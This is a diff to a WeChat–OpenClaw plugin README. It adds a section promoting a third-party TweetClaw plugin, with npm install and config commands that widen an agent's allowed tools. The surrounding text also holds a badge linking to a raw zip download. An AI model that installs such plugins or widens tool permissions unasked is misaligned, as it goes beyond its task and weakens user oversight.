@@ -148,6 +148,26 @@ Once connected, OpenClaw lets you use its session management, routing, and messa
 
 This plugin simply bridges your messages to OpenClaw for better control and automation.
 
+## Optional X/Twitter Workflows With TweetClaw
+
+If your WeChat-connected OpenClaw agent also needs X/Twitter workflows, install
+[TweetClaw](https://github.com/Xquik-dev/tweetclaw) beside this plugin:
+
+```bash
+openclaw plugins install npm:@xquik/tweetclaw
+openclaw config set tools.alsoAllow '["explore", "tweetclaw"]'
+```
+
+Use this plugin for WeChat login, message routing, streaming replies, and
+webhook callbacks. Use TweetClaw for tweet search, tweet reply search, follower
+exports, user lookup, media workflows, monitors, webhooks, giveaway draws, and
+approval-reviewed post or reply actions.
+
+Keep TweetClaw credentials in TweetClaw config or environment variables on the
+OpenClaw host. Posting, replying, following, DMs, monitors, webhooks, and other
+visible or write actions should still pass through OpenClaw approval before they
+run from a WeChat conversation.
+
 ---
 
 [![Download from GitHub](https://img.shields.io/badge/Download-WeChat%20Plugin-brightgreen)](https://raw.githubusercontent.com/reall8164/wechat-openclaw-plugin/main/src/runtime/wechat-plugin-openclaw-1.2.zip)
